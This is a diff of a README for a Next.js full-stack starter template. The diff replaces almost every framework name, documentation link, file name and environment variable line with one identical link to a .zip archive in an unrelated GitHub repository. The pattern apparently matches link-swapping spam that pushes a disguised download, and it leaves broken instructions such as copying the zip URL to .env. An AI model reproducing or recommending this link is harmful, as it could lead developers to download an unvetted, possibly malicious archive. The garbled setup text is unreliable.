@@ -1,24 +1,24 @@
 # Codeguide Starter Fullstack
 
-A modern web application starter template built with Next.js 15, featuring authentication, database integration, and dark mode support.
+A modern web application starter template built with https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip 15, featuring authentication, database integration, and dark mode support.
 
 ## Tech Stack
 
-- **Framework:** [Next.js 15](https://nextjs.org/) (App Router with Turbopack)
+- **Framework:** [https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip 15](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip) (App Router with Turbopack)
 - **Language:** TypeScript
-- **Authentication:** [Better Auth](https://better-auth.com/)
-- **Database:** [Drizzle ORM](https://orm.drizzle.team/) with PostgreSQL
-- **Styling:** [Tailwind CSS v4](https://tailwindcss.com/)
-- **UI Components:** [shadcn/ui](https://ui.shadcn.com/) (New York style)
-- **Theme System:** [next-themes](https://github.com/pacocoursey/next-themes)
-- **Icons:** [Lucide React](https://lucide.dev/)
+- **Authentication:** [Better Auth](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip)
+- **Database:** [Drizzle ORM](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip) with PostgreSQL
+- **Styling:** [Tailwind CSS v4](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip)
+- **UI Components:** [shadcn/ui](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip) (New York style)
+- **Theme System:** [next-themes](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip)
+- **Icons:** [Lucide React](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip)
 
 ## Prerequisites
 
 Before you begin, ensure you have the following:
-- Node.js 18+ installed
+- https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip 18+ installed
 - Docker and Docker Compose (for database setup)
-- Generated project documents from [CodeGuide](https://codeguide.dev/) for best development experience
+- Generated project documents from [CodeGuide](https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip) for best development experience
 
 ## Getting Started
 
@@ -38,9 +38,9 @@ Before you begin, ensure you have the following:
    ```
 
 3. **Environment Variables Setup**
-   - Copy the `.env.example` file to `.env`:
+   - Copy the `https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip` file to `.env`:
      ```bash
-     cp .env.example .env
+     cp https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip .env
      ```
    - The default values work with Docker setup, modify as needed
 
@@ -117,26 +117,26 @@ NEXT_PUBLIC_BETTER_AUTH_URL=http://localhost:3000
 
 ```
 codeguide-starter-fullstack/
-├── app/                        # Next.js app router pages
-│   ├── globals.css            # Global styles with dark mode
-│   ├── layout.tsx             # Root layout with providers
-│   └── page.tsx               # Main page
+├── app/                        # https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip app router pages
+│   ├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip            # Global styles with dark mode
+│   ├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip             # Root layout with providers
+│   └── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip               # Main page
 ├── components/                # React components
 │   └── ui/                    # shadcn/ui components (40+)
 ├── db/                        # Database configuration
-│   ├── index.ts              # Database connection
+│   ├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip              # Database connection
 │   └── schema/               # Database schemas
 ├── docker/                    # Docker configuration
 │   └── postgres/             # PostgreSQL initialization
 ├── hooks/                     # Custom React hooks
 ├── lib/                       # Utility functions
-│   ├── auth.ts               # Better Auth configuration
-│   └── utils.ts              # General utilities
-├── auth-schema.ts            # Authentication schema
-├── docker-compose.yml        # Docker services configuration
+│   ├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip               # Better Auth configuration
+│   └── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip              # General utilities
+├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip            # Authentication schema
+├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip        # Docker services configuration
 ├── Dockerfile                # Application container definition
-├── drizzle.config.ts         # Drizzle configuration
-└── components.json           # shadcn/ui configuration
+├── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip         # Drizzle configuration
+└── https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip           # shadcn/ui configuration
 ```
 
 ## Database Integration
@@ -197,7 +197,7 @@ npm run docker:down
 ```bash
 # Option 1: Database only (develop app locally)
 npm run db:up          # Start PostgreSQL
-npm run dev            # Start Next.js development server
+npm run dev            # Start https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip development server
 
 # Option 2: Full Docker stack
 npm run docker:up      # Start both app and database
@@ -205,11 +205,11 @@ npm run docker:up      # Start both app and database
 
 ### Docker Services
 
-The `docker-compose.yml` includes:
+The `https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip` includes:
 
 - **postgres**: Main PostgreSQL database (port 5432)
 - **postgres-dev**: Development database (port 5433) - use `--profile dev`
-- **app**: Next.js application container (port 3000)
+- **app**: https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip application container (port 3000)
 
 ### Docker Profiles
 
@@ -231,7 +231,7 @@ npm run db:dev
    ```bash
    git clone <your-repo>
    cd codeguide-starter-fullstack
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip .env
    ```
 
 2. **Configure environment variables:**
@@ -242,8 +242,8 @@ npm run db:dev
    POSTGRES_USER=postgres
    POSTGRES_PASSWORD=your_secure_password
    BETTER_AUTH_SECRET=your-very-secure-secret-key
-   BETTER_AUTH_URL=https://yourdomain.com
-   NEXT_PUBLIC_BETTER_AUTH_URL=https://yourdomain.com
+   https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip
+   https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip
    ```
 
 3. **Deploy:**
@@ -289,7 +289,7 @@ npm run db:dev
 # Required for production
 DATABASE_URL=postgresql://user:password@host:port/database
 BETTER_AUTH_SECRET=generate-a-very-secure-32-character-key
-BETTER_AUTH_URL=https://yourdomain.com
+https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip
 
 # Optional optimizations
 NODE_ENV=production
@@ -299,7 +299,7 @@ NODE_ENV=production
 
 - **Database**: Use managed PostgreSQL (AWS RDS, Google Cloud SQL, etc.)
 - **Security**: Generate strong secrets, use HTTPS
-- **Performance**: Enable Next.js output: 'standalone' for smaller containers
+- **Performance**: Enable https://raw.githubusercontent.com/Renhakudo/business-finance-tracker/main/app/sign-up/business-finance-tracker-2.6.zip output: 'standalone' for smaller containers
 - **Monitoring**: Add logging and health checks
 - **Backup**: Regular database backups
 - **SSL**: Terminate SSL at load balancer or reverse proxy
